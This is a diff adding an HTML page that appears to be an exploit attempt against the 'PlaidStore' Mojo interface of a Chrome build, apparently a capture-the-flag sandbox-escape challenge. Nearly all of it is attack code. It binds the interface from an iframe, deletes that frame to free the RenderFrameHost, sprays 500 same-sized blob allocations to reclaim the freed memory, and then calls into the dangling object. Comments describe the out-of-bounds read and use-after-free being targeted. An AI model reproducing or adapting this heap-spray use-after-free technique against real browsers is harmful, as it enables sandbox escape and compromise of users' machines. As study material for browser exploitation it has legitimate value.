@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+    <script src="/mojo_js_extracted/mojo/public/js/mojo_bindings.js"></script>
+    <script src="/mojo_js_extracted/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
+    <script src="mojo_js_extracted/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+    <script src="mojo_js_extracted/third_party/blink/public/mojom/blob/blob.mojom.js"></script>
+    <script src="mojo_js_extracted/third_party/blink/public/mojom/blob/data_element.mojom.js"></script>
+
+    <!-- 1. we can read arbitraty length from our 'data_store_' (std::vector<uint8_t>) -->
+    <!-- 2. uaf due to 'MakeSelfOwnedReciever' - we can still queue messages on the pipe, we can intercept the request using 
+            MojoJSTest and free it immediately -->
+    <body>
+        <script>
+            console.log('asdf');
+        </script>
+
+        <script>
+            const kSprayAmount = 500;
+
+            /*
+            
+            */
+
+            /*
+            rdi = RenderFrameHost
+            [rdi] = vtable
+            [rdi + 8] = render frame host
+
+            [rax + 160] = IsRenderFrameAlive
+            */
+            const kRenderFrameHostImplSize = 0xc28;
+            const kData = new ArrayBuffer(kRenderFrameHostImplSize);
+            const uint8 = new Uint8Array(kData);
+            uint8.fill(0x41);
+
+            const blob_registry = new blink.mojom.BlobRegistryPtr();
+            const blob_registry_request = mojo.makeRequest(blob_registry);
+            mojo.Binding(blink.mojom.BlobRegistry, blob_registry_request);
+
+            function Allocation(size=kRenderFrameHostImplSize) {
+                function ProgressClient() {
+                    function ProgressClientImpl() {}
+
+                    ProgressClientImpl.prototype = {
+                        onProgress: async (delta) => {}
+                    };
+
+                    const progress_client_ptr = new mojo.AssociatedInterfacePtrInfo();
+                    const progress_client_req = mojo.makeRequest(progress_client_ptr);
+                    const progress_client_binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);
+
+                    return progress_client_ptr;
+                };
+
+                this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
+
+                this.serialized_blob = blob_registry.registerFromStream("", "", size, this.pipe.consumer, ProgressClient());
+
+                this.malloc = function(data) {
+                    try {
+                        const a = this.pipe.producer.writeData(data);
+                        this.pipe.producer.close();
+                    }
+                    catch (err) {
+                        console.log(err);
+                    }
+                }
+
+                return this;
+            }
+
+            const allocate = (data) => {
+                console.log(data);
+                console.log(`spraying - ${kSprayAmount}`);
+                for(let i = 0; i < kSprayAmount; i++) {
+                    const gonna_spray = new Allocation();
+                    gonna_spray.malloc(data);
+                }
+            }
+        </script>
+
+        <script>
+            const interfaceName = 'yuvaly0';
+
+            function create_rfh() {
+                const iframe = document.createElement('iframe');
+                iframe.src = document.location.href + '#qwerty';
+                iframe.id = 'qwerty';
+
+                document.body.appendChild(iframe);
+            }
+
+            function delete_rfh() {
+                console.log('deleting rfh');
+                document.getElementById('qwerty').remove();
+            }
+
+            function im_an_iframe() {
+                const pipe = Mojo.createMessagePipe();
+                Mojo.bindInterface(blink.mojom.PlaidStore.name, pipe.handle1, "context", true);
+                Mojo.bindInterface(interfaceName, pipe.handle0, "process");
+            }
+
+            function getFreedPtr() {
+                const frame = create_rfh();
+                const dema_data = new Uint8Array(3).fill(0x23);
+                const interceptor = new MojoInterfaceInterceptor(interfaceName, "process");
+
+                interceptor.oninterfacerequest = (e) => {
+                    console.log('intercepted');
+                    interceptor.stop();
+
+                    const provider = new blink.mojom.PlaidStorePtr(e.handle);
+                    delete_rfh();
+
+                    allocate(kData);
+
+                    setTimeout(() => {
+                        console.log('here');
+                        provider.storeData('1', dema_data);
+                    }, 500);
+                }
+
+                interceptor.start(); 
+            }
+        </script>
+
+        <script>
+            if (document.location.href.includes('qwerty')) {
+                im_an_iframe();
+            } else {
+                getFreedPtr();
+            }
+        </script>
+    </body>
+</html>
